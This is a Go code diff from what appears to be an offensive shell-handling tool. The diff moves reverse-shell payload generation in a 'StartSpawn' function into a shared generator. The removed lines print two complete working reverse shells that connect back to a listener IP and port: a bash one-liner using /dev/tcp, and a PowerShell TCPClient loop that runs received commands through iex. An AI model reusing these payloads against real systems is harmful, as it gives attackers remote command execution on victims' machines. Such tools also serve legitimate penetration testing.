@@ -2669,16 +2669,14 @@ func (m *Manager) StartSpawn() {
 		platform = "linux"
 	}
 
-	// Generate payload
+	// Generate payload using shared generator
+	gen := NewReverseShellGenerator(spawnIP, m.listenerPort)
 	var payload string
 	switch platform {
 	case "linux", "macos":
-		payload = fmt.Sprintf("bash -c 'exec bash >& /dev/tcp/%s/%d 0>&1 &'\n",
-			spawnIP, m.listenerPort)
+		payload = gen.GenerateBash() + "\n"
 	case "windows":
-		psScript := fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
-			spawnIP, m.listenerPort)
-		payload = fmt.Sprintf("powershell -c \"Start-Job -ScriptBlock {%s}\"\n", psScript)
+		payload = gen.GeneratePowerShell() + "\n"
 	default:
 		if m.transferDoneFunc != nil {
 			m.transferDoneFunc("spawn", false, fmt.Errorf("Unsupported platform: %s", platform))
